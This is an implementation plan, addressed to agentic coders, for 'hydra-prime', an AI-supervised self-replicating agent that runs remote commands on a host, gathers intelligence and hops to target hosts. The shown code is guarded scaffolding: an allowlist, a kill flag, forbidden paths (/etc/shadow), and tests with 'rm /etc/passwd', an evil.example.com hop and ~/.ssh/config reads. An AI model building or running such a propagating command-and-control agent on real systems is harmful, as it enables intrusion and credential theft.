# Hydra-Prime v1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build hydra-prime v1 — an autonomous goal-seeking organism (Cloudflare-hosted supervisor + ≤200-line bash script) that lands on a host, mines intelligence, reasons probabilistically about how to reach a target host, replicates itself there carrying distilled memory, and proves arrival within 24h.

**Architecture:** Asymmetric trust boundary. The script (`hydra.sh`) is dumb, obedient, headless — six primitives, no decision-making. The supervisor (Cloudflare Worker + MissionDO + KV + Workers AI/Groq/OpenRouter) is the agent: belief graph, Bayesian engine, codex, LLM router, hop orchestrator. Tick = `poll → execute → report → ingest`. Intelligence is remote; agent upgrades don't reship the script. Honor tiers (gold/silver/failure) tracked supervisor-side, tamper-proof.

**Tech Stack:** TypeScript (Workers, strict mode), Cloudflare Workers + Durable Objects + KV + Workers AI, Groq API, OpenRouter API, Web Crypto (HMAC-SHA256, Ed25519), Vitest with `@cloudflare/vitest-pool-workers` (Miniflare), Wrangler v3+, bash 4+, shellcheck, bats-core, Docker (Alpine + WSL test images).

**Spec reference:** `docs/superpowers/specs/2026-04-14-hydra-prime-design.md` (locked 2026-04-14).

**Repository root:** `C:\Users\ajay\Projects\hydra-prime\` (existing; contains README.md and docs/).

---

## Phase A — Foundation (Tasks 1–5)

### Task 1: Project scaffold

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `wrangler.toml`
- Create: `.gitignore`
- Create: `src/index.ts`
- Create: `vitest.config.ts`
- Create: `tests/smoke.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/smoke.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';

describe('worker smoke', () => {
  it('responds to /v1/health with 200 ok', async () => {
    const res = await SELF.fetch('https://example.com/v1/health');
    expect(res.status).toBe(200);
    expect(await res.text()).toBe('ok');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
cd C:/Users/ajay/Projects/hydra-prime
npx vitest run tests/smoke.test.ts
```

Expected: FAIL — module/config does not exist.

- [ ] **Step 3: Write minimal implementation**

`package.json`:

```json
{
  "name": "hydra-prime",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "scripts": {
    "dev": "wrangler dev",
    "deploy": "wrangler deploy",
    "test": "vitest run",
    "test:watch": "vitest",
    "typecheck": "tsc --noEmit"
  },
  "devDependencies": {
    "@cloudflare/vitest-pool-workers": "^0.5.0",
    "@cloudflare/workers-types": "^4.20240909.0",
    "typescript": "^5.5.0",
    "vitest": "^2.0.0",
    "wrangler": "^3.78.0"
  }
}
```

`tsconfig.json`:

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ES2022",
    "moduleResolution": "Bundler",
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "lib": ["ES2022"],
    "types": ["@cloudflare/workers-types/2023-07-01", "@cloudflare/vitest-pool-workers"],
    "skipLibCheck": true,
    "esModuleInterop": true,
    "resolveJsonModule": true,
    "isolatedModules": true,
    "noEmit": true
  },
  "include": ["src/**/*", "tests/**/*"]
}
```

`wrangler.toml`:

```toml
name = "hydra-prime-supervisor"
main = "src/index.ts"
compatibility_date = "2024-09-23"
compatibility_flags = ["nodejs_compat"]

[[durable_objects.bindings]]
name = "MISSION_DO"
class_name = "MissionDO"

[[migrations]]
tag = "v1"
new_classes = ["MissionDO"]

[[kv_namespaces]]
binding = "HYDRA_KV"
id = "PLACEHOLDER_TO_BE_FILLED_AFTER_CREATE"

[ai]
binding = "AI"
```

`vitest.config.ts`:

```typescript
import { defineWorkersConfig } from '@cloudflare/vitest-pool-workers/config';

export default defineWorkersConfig({
  test: {
    poolOptions: {
      workers: {
        wrangler: { configPath: './wrangler.toml' },
      },
    },
  },
});
```

`.gitignore`:

```
node_modules/
.wrangler/
.dev.vars
*.log
.env
```

`src/index.ts`:

```typescript
export { MissionDO } from './mission-do';

export interface Env {
  MISSION_DO: DurableObjectNamespace;
  HYDRA_KV: KVNamespace;
  AI: Ai;
}

export default {
  async fetch(req: Request, env: Env): Promise<Response> {
    const url = new URL(req.url);
    if (url.pathname === '/v1/health') return new Response('ok');
    return new Response('not found', { status: 404 });
  },
};
```

`src/mission-do.ts` (stub so wrangler picks up the class):

```typescript
export class MissionDO {
  constructor(private state: DurableObjectState, private env: unknown) {}
  async fetch(req: Request): Promise<Response> {
    return new Response('stub', { status: 501 });
  }
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npm install
npx vitest run tests/smoke.test.ts
```

Expected: PASS, 1 test.

- [ ] **Step 5: Commit**

```bash
git add package.json tsconfig.json wrangler.toml .gitignore src/ vitest.config.ts tests/
git commit -m "feat: scaffold hydra-prime supervisor (Worker + DO + Vitest)"
```

---

### Task 2: Wire protocol types

**Files:**
- Create: `src/types.ts`
- Create: `tests/types.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/types.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { isDirective, isReportEnvelope, parseDirective } from '../src/types';

describe('wire types', () => {
  it('accepts a valid exec directive', () => {
    const d = { id: 'op_1', op: 'exec', cmd: 'ls', timeout_s: 5 };
    expect(isDirective(d)).toBe(true);
  });

  it('rejects directive without id', () => {
    expect(isDirective({ op: 'exec', cmd: 'ls', timeout_s: 5 })).toBe(false);
  });

  it('parses report envelope success', () => {
    const env = { op_id: 'op_1', ok: true, data: { stdout: 'hi' }, wall_ms: 3 };
    expect(isReportEnvelope(env)).toBe(true);
  });

  it('parseDirective throws on unknown op', () => {
    expect(() => parseDirective(JSON.stringify({ id: 'x', op: 'sing' }))).toThrow();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/types.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/types.ts`:

```typescript
export type DirectiveOp = 'exec' | 'read' | 'yield' | 'terminate';

export interface ExecDirective { id: string; op: 'exec'; cmd: string; timeout_s: number; }
export interface ReadDirective { id: string; op: 'read'; path: string; max_bytes: number; }
export interface YieldDirective { id: string; op: 'yield'; sleep_s: number; }
export interface TerminateDirective { id: string; op: 'terminate'; reason: string; }
export type Directive = ExecDirective | ReadDirective | YieldDirective | TerminateDirective;

export interface ReportSuccess { op_id: string; ok: true; data: Record<string, unknown>; wall_ms: number; }
export interface ReportFailure { op_id: string; ok: false; err: string; wall_ms: number; }
export type ReportEnvelope = ReportSuccess | ReportFailure;

export interface RegisterRequest {
  fingerprint: string;
  platform: 'linux' | 'macos' | 'wsl';
  version: string;
  resume_packet?: string;
}

export interface RegisterResponse {
  mission_id: string;
  session_key: string;
  poll_interval_s: number;
}

export interface MissionState {
  mission_id: string;
  origin_fingerprint: string;
  platform: 'linux' | 'macos' | 'wsl';
  phase: Phase;
  honor_tier: 'gold' | 'silver' | 'failed';
  budget_paid_usd_remaining: number;
  strict_gold: boolean;
  wall_clock_started_ms: number;
  wall_clock_deadline_ms: number;
  tick: number;
  beliefs: Record<string, import('./engine/beliefs').Hypothesis>;
  jump_chain: string[];
  target_allowlist: string[];
}

export type Phase =
  | 'registered' | 'provisioning' | 'scanning' | 'hypothesizing'
  | 'planning' | 'executing-hop' | 'verifying' | 'completed'
  | 'failed' | 'terminated';

export function isDirective(x: unknown): x is Directive {
  if (typeof x !== 'object' || x === null) return false;
  const o = x as Record<string, unknown>;
  if (typeof o.id !== 'string' || typeof o.op !== 'string') return false;
  return ['exec', 'read', 'yield', 'terminate'].includes(o.op);
}

export function isReportEnvelope(x: unknown): x is ReportEnvelope {
  if (typeof x !== 'object' || x === null) return false;
  const o = x as Record<string, unknown>;
  return typeof o.op_id === 'string' && typeof o.ok === 'boolean' && typeof o.wall_ms === 'number';
}

export function parseDirective(raw: string): Directive {
  const v = JSON.parse(raw);
  if (!isDirective(v)) throw new Error(`invalid directive: ${raw}`);
  return v;
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/types.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/types.ts tests/types.test.ts
git commit -m "feat: wire protocol types and guards"
```

---

### Task 3: HMAC sign/verify + XOR token mask

**Files:**
- Create: `src/hmac.ts`
- Create: `tests/hmac.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/hmac.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { signRequest, verifyRequest, maskToken, unmaskToken } from '../src/hmac';

describe('HMAC', () => {
  const key = 'k_test_session_key_aaaaaaaaaaaaaa';

  it('round-trips sign/verify', async () => {
    const sig = await signRequest(key, 'POST', '/v1/report', '{"x":1}', 1700000000);
    const ok = await verifyRequest(key, 'POST', '/v1/report', '{"x":1}', 1700000000, sig);
    expect(ok).toBe(true);
  });

  it('rejects tampered body', async () => {
    const sig = await signRequest(key, 'POST', '/v1/report', '{"x":1}', 1700000000);
    const ok = await verifyRequest(key, 'POST', '/v1/report', '{"x":2}', 1700000000, sig);
    expect(ok).toBe(false);
  });

  it('rejects timestamp drift > 60s', async () => {
    const now = Math.floor(Date.now() / 1000);
    const sig = await signRequest(key, 'GET', '/v1/poll', '', now - 120);
    const ok = await verifyRequest(key, 'GET', '/v1/poll', '', now - 120, sig, { now, windowS: 60 });
    expect(ok).toBe(false);
  });
});

describe('Token masking', () => {
  it('round-trips mask/unmask with matching fingerprint', async () => {
    const token = new Uint8Array(32).map((_, i) => i + 1);
    const fp = 'sha256:abcdef';
    const salt = 'salt_xyz';
    const masked = await maskToken(token, fp, salt);
    const recovered = await unmaskToken(masked, fp, salt);
    expect(Array.from(recovered)).toEqual(Array.from(token));
  });

  it('returns garbage on fingerprint mismatch', async () => {
    const token = new Uint8Array(32).map((_, i) => i + 1);
    const masked = await maskToken(token, 'sha256:right', 'salt');
    const recovered = await unmaskToken(masked, 'sha256:wrong', 'salt');
    expect(Array.from(recovered)).not.toEqual(Array.from(token));
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/hmac.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/hmac.ts`:

```typescript
const enc = new TextEncoder();

async function hmacKey(secret: string): Promise<CryptoKey> {
  return crypto.subtle.importKey(
    'raw', enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false, ['sign', 'verify'],
  );
}

function toHex(buf: ArrayBuffer): string {
  return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, '0')).join('');
}

function fromHex(hex: string): Uint8Array {
  const out = new Uint8Array(hex.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return out;
}

export async function signRequest(
  sessionKey: string, method: string, path: string, body: string, ts: number,
): Promise<string> {
  const key = await hmacKey(sessionKey);
  const msg = `${method}\n${path}\n${body}\n${ts}`;
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(msg));
  return toHex(sig);
}

export async function verifyRequest(
  sessionKey: string, method: string, path: string, body: string, ts: number, sigHex: string,
  opts?: { now?: number; windowS?: number },
): Promise<boolean> {
  const now = opts?.now ?? Math.floor(Date.now() / 1000);
  const window = opts?.windowS ?? 60;
  if (Math.abs(now - ts) > window) return false;
  const expected = await signRequest(sessionKey, method, path, body, ts);
  if (expected.length !== sigHex.length) return false;
  let diff = 0;
  for (let i = 0; i < expected.length; i++) diff |= expected.charCodeAt(i) ^ sigHex.charCodeAt(i);
  return diff === 0;
}

export async function maskToken(token: Uint8Array, fingerprint: string, salt: string): Promise<Uint8Array> {
  const key = await hmacKey(salt);
  const mask = await crypto.subtle.sign('HMAC', key, enc.encode(fingerprint));
  const m = new Uint8Array(mask).slice(0, token.length);
  const out = new Uint8Array(token.length);
  for (let i = 0; i < token.length; i++) out[i] = token[i]! ^ m[i]!;
  return out;
}

export async function unmaskToken(masked: Uint8Array, fingerprint: string, salt: string): Promise<Uint8Array> {
  return maskToken(masked, fingerprint, salt);
}

export { fromHex, toHex };
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/hmac.test.ts
```

Expected: PASS, 5 tests.

- [ ] **Step 5: Commit**

```bash
git add src/hmac.ts tests/hmac.test.ts
git commit -m "feat: HMAC request signing + XOR token masking"
```

---

### Task 4: Codex pure module

**Files:**
- Create: `src/codex.ts`
- Create: `tests/codex.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/codex.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { evaluate, buildPromptPrefix } from '../src/codex';
import type { MissionState } from '../src/types';

const baseMission: MissionState = {
  mission_id: 'm1', origin_fingerprint: 'fp', platform: 'linux',
  phase: 'scanning', honor_tier: 'gold',
  budget_paid_usd_remaining: 10, strict_gold: false,
  wall_clock_started_ms: 0, wall_clock_deadline_ms: 86_400_000,
  tick: 0, beliefs: {}, jump_chain: ['origin'],
  target_allowlist: ['origin', 'kvm2', 'kvm4'],
};

describe('codex pre-action gate', () => {
  it('allows read inside HYDRA_HOME-relative paths', () => {
    expect(evaluate({ type: 'read', path: '/home/user/.ssh/config' }, baseMission).allowed).toBe(true);
  });

  it('blocks attempt_hop to non-allowlisted host (§1.1)', () => {
    const d = evaluate({ type: 'attempt_hop', targetHost: 'evil.example.com' }, baseMission);
    expect(d.allowed).toBe(false);
    expect(d.rule).toBe('§1.1');
  });

  it('allows attempt_hop to allowlisted host', () => {
    expect(evaluate({ type: 'attempt_hop', targetHost: 'kvm2' }, baseMission).allowed).toBe(true);
  });

  it('blocks mutation on origin (§1.3)', () => {
    const d = evaluate({ type: 'exec', cmd: 'rm /etc/passwd', isMutation: true }, baseMission);
    expect(d.allowed).toBe(false);
    expect(d.rule).toBe('§1.3');
  });

  it('blocks any action when wall-clock exceeded (§2.1)', () => {
    const m = { ...baseMission, wall_clock_started_ms: -86_400_001 };
    const d = evaluate({ type: 'exec', cmd: 'ls' }, m);
    expect(d.allowed).toBe(false);
    expect(d.rule).toBe('§2.1');
  });

  it('blocks budget exhaustion under strict_gold (§2.2)', () => {
    const m = { ...baseMission, strict_gold: true, budget_paid_usd_remaining: 0, honor_tier: 'silver' as const };
    const d = evaluate({ type: 'exec', cmd: 'ls' }, m);
    expect(d.allowed).toBe(false);
    expect(d.rule).toBe('§2.2');
  });
});

describe('prompt prefix', () => {
  it('includes allowlist and budget state', () => {
    const prefix = buildPromptPrefix(baseMission);
    expect(prefix).toContain('CODEX');
    expect(prefix).toContain('kvm2');
    expect(prefix).toContain('budget');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/codex.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/codex.ts`:

```typescript
import type { MissionState } from './types';

export type ActionType = 'exec' | 'read' | 'attempt_hop' | 'signal_success' | 'terminate';

export interface ProposedAction {
  type: ActionType;
  cmd?: string;
  path?: string;
  targetHost?: string;
  isMutation?: boolean;
}

export interface CodexDecision {
  allowed: boolean;
  rule?: string;
  reason?: string;
}

const FORBIDDEN_PATHS = [/^\/etc\/shadow$/, /^\/root\//, /^\/var\/log\/auth\.log$/];

export function evaluate(action: ProposedAction, m: MissionState): CodexDecision {
  // §2.1 — 24h hard cap
  const elapsed = Date.now() - m.wall_clock_started_ms;
  if (elapsed > 86_400_000) return { allowed: false, rule: '§2.1', reason: '24h wall-clock exceeded' };

  // §2.2 — budget cap
  if (m.strict_gold && m.honor_tier !== 'gold') {
    return { allowed: false, rule: '§2.2', reason: 'strict_gold and tier crossed to paid' };
  }
  if (m.budget_paid_usd_remaining < 0) {
    return { allowed: false, rule: '§2.2', reason: 'paid budget exhausted' };
  }

  switch (action.type) {
    case 'attempt_hop': {
      // §1.1 — allowlist
      if (!action.targetHost || !m.target_allowlist.includes(action.targetHost)) {
        return { allowed: false, rule: '§1.1', reason: `target ${action.targetHost} not allowlisted` };
      }
      return { allowed: true };
    }
    case 'exec': {
      // §1.3 — read before write
      if (action.isMutation) {
        return { allowed: false, rule: '§1.3', reason: 'mutation on origin denied' };
      }
      return { allowed: true };
    }
    case 'read': {
      if (action.path && FORBIDDEN_PATHS.some(re => re.test(action.path!))) {
        return { allowed: false, rule: '§1.3', reason: `path ${action.path} forbidden` };
      }
      return { allowed: true };
    }
    case 'signal_success':
    case 'terminate':
      return { allowed: true };
  }
}

export function buildPromptPrefix(m: MissionState): string {
  const remainingS = Math.max(0, Math.floor((m.wall_clock_deadline_ms - Date.now()) / 1000));
  return [
    `# CODEX (non-negotiable)`,
    `Authorized hosts: ${m.target_allowlist.join(', ')}`,
    `Forbidden: third-party exfiltration, mutation on origin (except vault writes & sanctioned SSH-out), self-persistence beyond mission.`,
    `Budget: paid_usd_remaining=${m.budget_paid_usd_remaining.toFixed(2)}, strict_gold=${m.strict_gold}, tier=${m.honor_tier}`,
    `Time remaining: ${remainingS}s`,
    `Mission: reach a target on the allowlist and submit signed success proof.`,
    `Output: respond ONLY in the requested structured format. No prose outside it.`,
    ``,
  ].join('\n');
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/codex.test.ts
```

Expected: PASS, 7 tests.

- [ ] **Step 5: Commit**

```bash
git add src/codex.ts tests/codex.test.ts
git commit -m "feat: codex pre-action gate + system-prompt prefix"
```

---

### Task 5: Storage helpers (KV + DO state schemas)

**Files:**
- Create: `src/storage.ts`
- Create: `tests/storage.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/storage.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { env } from 'cloudflare:test';
import { putRateCounter, getRateCounter, putKillFlag, isKilled, putCatalogEntry, getCatalogEntry } from '../src/storage';

describe('storage helpers', () => {
  it('round-trips rate counter', async () => {
    await putRateCounter(env.HYDRA_KV, 'm1:groq', 5);
    expect(await getRateCounter(env.HYDRA_KV, 'm1:groq')).toBe(5);
  });

  it('kill flag default false', async () => {
    expect(await isKilled(env.HYDRA_KV, 'mX')).toBe(false);
  });

  it('kill flag round-trip', async () => {
    await putKillFlag(env.HYDRA_KV, 'm2');
    expect(await isKilled(env.HYDRA_KV, 'm2')).toBe(true);
  });

  it('catalog entry round-trip', async () => {
    await putCatalogEntry(env.HYDRA_KV, 'probe-x', JSON.stringify({ id: 'probe-x' }));
    const got = await getCatalogEntry(env.HYDRA_KV, 'probe-x');
    expect(got).toContain('probe-x');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/storage.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/storage.ts`:

```typescript
const RATE_PREFIX = 'rate:';
const KILL_PREFIX = 'kill:';
const CATALOG_PREFIX = 'catalog:';

export async function putRateCounter(kv: KVNamespace, key: string, value: number): Promise<void> {
  await kv.put(RATE_PREFIX + key, String(value));
}
export async function getRateCounter(kv: KVNamespace, key: string): Promise<number> {
  const v = await kv.get(RATE_PREFIX + key);
  return v ? parseInt(v, 10) : 0;
}
export async function incrRateCounter(kv: KVNamespace, key: string, by = 1): Promise<number> {
  const cur = await getRateCounter(kv, key);
  const next = cur + by;
  await putRateCounter(kv, key, next);
  return next;
}

export async function putKillFlag(kv: KVNamespace, missionId: string): Promise<void> {
  await kv.put(KILL_PREFIX + missionId, '1', { expirationTtl: 86_400 * 7 });
}
export async function isKilled(kv: KVNamespace, missionId: string): Promise<boolean> {
  return (await kv.get(KILL_PREFIX + missionId)) === '1';
}

export async function putCatalogEntry(kv: KVNamespace, id: string, json: string): Promise<void> {
  await kv.put(CATALOG_PREFIX + id, json);
}
export async function getCatalogEntry(kv: KVNamespace, id: string): Promise<string | null> {
  return kv.get(CATALOG_PREFIX + id);
}
export async function listCatalogIds(kv: KVNamespace): Promise<string[]> {
  const list = await kv.list({ prefix: CATALOG_PREFIX });
  return list.keys.map(k => k.name.slice(CATALOG_PREFIX.length));
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/storage.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/storage.ts tests/storage.test.ts
git commit -m "feat: KV storage helpers (rate, kill, catalog)"
```

---

## Phase B — Wire & MissionDO skeleton (Tasks 6–10)

### Task 6: MissionDO state machine

**Files:**
- Modify: `src/mission-do.ts` (replace stub)
- Create: `tests/mission-do.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/mission-do.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { env } from 'cloudflare:test';

async function callDo(missionId: string, path: string, init?: RequestInit): Promise<Response> {
  const id = env.MISSION_DO.idFromName(missionId);
  const stub = env.MISSION_DO.get(id);
  return stub.fetch(`https://do/${path}`, init);
}

describe('MissionDO', () => {
  it('starts in registered phase after init', async () => {
    const res = await callDo('m_test_1', 'init', {
      method: 'POST',
      body: JSON.stringify({
        fingerprint: 'fp1', platform: 'linux',
        target_allowlist: ['origin', 'kvm2'], strict_gold: false,
        budget_paid_usd: 10, deadline_ms: Date.now() + 86_400_000,
      }),
    });
    expect(res.status).toBe(200);
    const state = await res.json() as { phase: string };
    expect(state.phase).toBe('registered');
  });

  it('transitions to scanning on /transition', async () => {
    await callDo('m_test_2', 'init', { method: 'POST', body: JSON.stringify({
      fingerprint: 'fp2', platform: 'linux',
      target_allowlist: ['origin', 'kvm2'], strict_gold: false,
      budget_paid_usd: 10, deadline_ms: Date.now() + 86_400_000,
    })});
    const res = await callDo('m_test_2', 'transition', { method: 'POST', body: JSON.stringify({ to: 'scanning' }) });
    expect(res.status).toBe(200);
    const after = await (await callDo('m_test_2', 'state')).json() as { phase: string };
    expect(after.phase).toBe('scanning');
  });

  it('rejects illegal transition', async () => {
    await callDo('m_test_3', 'init', { method: 'POST', body: JSON.stringify({
      fingerprint: 'fp3', platform: 'linux',
      target_allowlist: ['origin'], strict_gold: false,
      budget_paid_usd: 10, deadline_ms: Date.now() + 86_400_000,
    })});
    const res = await callDo('m_test_3', 'transition', { method: 'POST', body: JSON.stringify({ to: 'completed' }) });
    expect(res.status).toBe(409);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/mission-do.test.ts
```

Expected: FAIL — DO returns 501 stub.

- [ ] **Step 3: Write minimal implementation**

`src/mission-do.ts`:

```typescript
import type { MissionState, Phase } from './types';

const LEGAL: Record<Phase, Phase[]> = {
  registered: ['provisioning', 'failed', 'terminated'],
  provisioning: ['scanning', 'failed', 'terminated'],
  scanning: ['hypothesizing', 'failed', 'terminated'],
  hypothesizing: ['planning', 'scanning', 'failed', 'terminated'],
  planning: ['executing-hop', 'hypothesizing', 'failed', 'terminated'],
  'executing-hop': ['verifying', 'planning', 'failed', 'terminated'],
  verifying: ['completed', 'failed', 'terminated'],
  completed: [],
  failed: [],
  terminated: [],
};

export class MissionDO {
  private state: DurableObjectState;
  private mission: MissionState | null = null;

  constructor(state: DurableObjectState, _env: unknown) {
    this.state = state;
    this.state.blockConcurrencyWhile(async () => {
      this.mission = (await this.state.storage.get<MissionState>('mission')) ?? null;
    });
  }

  async fetch(req: Request): Promise<Response> {
    const url = new URL(req.url);
    const route = url.pathname.replace(/^\//, '');
    if (route === 'init') return this.init(req);
    if (route === 'state') return this.getState();
    if (route === 'transition') return this.transition(req);
    return new Response('not found', { status: 404 });
  }

  private async init(req: Request): Promise<Response> {
    if (this.mission) return new Response('already initialized', { status: 409 });
    const body = await req.json() as {
      fingerprint: string; platform: 'linux' | 'macos' | 'wsl';
      target_allowlist: string[]; strict_gold: boolean;
      budget_paid_usd: number; deadline_ms: number;
    };
    const id = await this.state.id.toString();
    this.mission = {
      mission_id: id,
      origin_fingerprint: body.fingerprint,
      platform: body.platform,
      phase: 'registered',
      honor_tier: 'gold',
      budget_paid_usd_remaining: body.budget_paid_usd,
      strict_gold: body.strict_gold,
      wall_clock_started_ms: Date.now(),
      wall_clock_deadline_ms: body.deadline_ms,
      tick: 0,
      beliefs: {},
      jump_chain: ['origin'],
      target_allowlist: body.target_allowlist,
    };
    await this.state.storage.put('mission', this.mission);
    return Response.json(this.mission);
  }

  private async getState(): Promise<Response> {
    if (!this.mission) return new Response('not initialized', { status: 404 });
    return Response.json(this.mission);
  }

  private async transition(req: Request): Promise<Response> {
    if (!this.mission) return new Response('not initialized', { status: 404 });
    const { to } = await req.json() as { to: Phase };
    const allowed = LEGAL[this.mission.phase];
    if (!allowed.includes(to)) {
      return new Response(`illegal: ${this.mission.phase} -> ${to}`, { status: 409 });
    }
    this.mission.phase = to;
    await this.state.storage.put('mission', this.mission);
    return Response.json(this.mission);
  }
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/mission-do.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/mission-do.ts tests/mission-do.test.ts
git commit -m "feat: MissionDO state machine + phase transitions"
```

---

### Task 7: /register endpoint

**Files:**
- Create: `src/endpoints/register.ts`
- Modify: `src/index.ts`
- Create: `tests/register.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/register.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF, env } from 'cloudflare:test';
import { putKillFlag } from '../src/storage';

async function startMission(): Promise<string> {
  const res = await SELF.fetch('https://h/v1/admin/mission/start', {
    method: 'POST',
    headers: { 'X-Admin-Key': env.ADMIN_KEY ?? 'dev-admin' },
    body: JSON.stringify({
      fingerprint_expected: 'fp_origin',
      target_allowlist: ['origin', 'kvm2'],
      strict_gold: false,
      budget_paid_usd: 10,
      deadline_seconds: 86_400,
    }),
  });
  const body = await res.json() as { mission_id: string };
  return body.mission_id;
}

describe('/v1/register', () => {
  it('issues mission_id + session_key for matching fingerprint', async () => {
    const mission_id = await startMission();
    const res = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ fingerprint: 'fp_origin', platform: 'linux', version: '0.1.0', mission_id }),
    });
    expect(res.status).toBe(200);
    const body = await res.json() as { mission_id: string; session_key: string; poll_interval_s: number };
    expect(body.mission_id).toBe(mission_id);
    expect(body.session_key.length).toBeGreaterThan(20);
    expect(body.poll_interval_s).toBeGreaterThan(0);
  });

  it('refuses on fingerprint mismatch', async () => {
    const mission_id = await startMission();
    const res = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ fingerprint: 'fp_wrong', platform: 'linux', version: '0.1.0', mission_id }),
    });
    expect(res.status).toBe(403);
  });

  it('refuses if mission killed', async () => {
    const mission_id = await startMission();
    await putKillFlag(env.HYDRA_KV, mission_id);
    const res = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ fingerprint: 'fp_origin', platform: 'linux', version: '0.1.0', mission_id }),
    });
    expect(res.status).toBe(410);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/register.test.ts
```

Expected: FAIL — endpoints not wired.

- [ ] **Step 3: Write minimal implementation**

`src/endpoints/register.ts`:

```typescript
import type { Env } from '../index';
import { isKilled } from '../storage';

export async function handleRegister(req: Request, env: Env): Promise<Response> {
  const body = await req.json() as {
    fingerprint: string; platform: 'linux' | 'macos' | 'wsl'; version: string; mission_id: string;
  };
  if (!body.mission_id) return new Response('mission_id required', { status: 400 });

  if (await isKilled(env.HYDRA_KV, body.mission_id)) {
    return new Response('mission killed', { status: 410 });
  }

  const id = env.MISSION_DO.idFromName(body.mission_id);
  const stub = env.MISSION_DO.get(id);
  const stateRes = await stub.fetch('https://do/state');
  if (stateRes.status !== 200) return new Response('mission not started', { status: 404 });
  const mission = await stateRes.json() as { origin_fingerprint: string; mission_id: string };
  if (mission.origin_fingerprint !== body.fingerprint) {
    return new Response('fingerprint mismatch', { status: 403 });
  }

  const sessionKeyBytes = new Uint8Array(32);
  crypto.getRandomValues(sessionKeyBytes);
  const session_key = [...sessionKeyBytes].map(b => b.toString(16).padStart(2, '0')).join('');
  await env.HYDRA_KV.put(`session:${body.mission_id}`, session_key, { expirationTtl: 86_400 });

  return Response.json({
    mission_id: body.mission_id,
    session_key,
    poll_interval_s: 5,
  });
}
```

`src/index.ts` (replace previous `fetch`):

```typescript
import { handleRegister } from './endpoints/register';
export { MissionDO } from './mission-do';

export interface Env {
  MISSION_DO: DurableObjectNamespace;
  HYDRA_KV: KVNamespace;
  AI: Ai;
  ADMIN_KEY?: string;
}

export default {
  async fetch(req: Request, env: Env): Promise<Response> {
    const url = new URL(req.url);
    if (url.pathname === '/v1/health') return new Response('ok');
    if (url.pathname === '/v1/register' && req.method === 'POST') return handleRegister(req, env);
    if (url.pathname === '/v1/admin/mission/start' && req.method === 'POST') {
      // Minimal admin stub, full impl in Phase J
      const body = await req.json() as {
        fingerprint_expected: string; target_allowlist: string[];
        strict_gold: boolean; budget_paid_usd: number; deadline_seconds: number;
      };
      const mission_id = `m_${crypto.randomUUID()}`;
      const id = env.MISSION_DO.idFromName(mission_id);
      const stub = env.MISSION_DO.get(id);
      await stub.fetch('https://do/init', {
        method: 'POST',
        body: JSON.stringify({
          fingerprint: body.fingerprint_expected,
          platform: 'linux',
          target_allowlist: body.target_allowlist,
          strict_gold: body.strict_gold,
          budget_paid_usd: body.budget_paid_usd,
          deadline_ms: Date.now() + body.deadline_seconds * 1000,
        }),
      });
      return Response.json({ mission_id });
    }
    return new Response('not found', { status: 404 });
  },
};
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/register.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/register.ts src/index.ts tests/register.test.ts
git commit -m "feat: /v1/register endpoint with fingerprint check + kill flag"
```

---

### Task 8: /poll endpoint with mock action picker

**Files:**
- Create: `src/endpoints/poll.ts`
- Modify: `src/mission-do.ts` (add nextDirective stub)
- Modify: `src/index.ts`
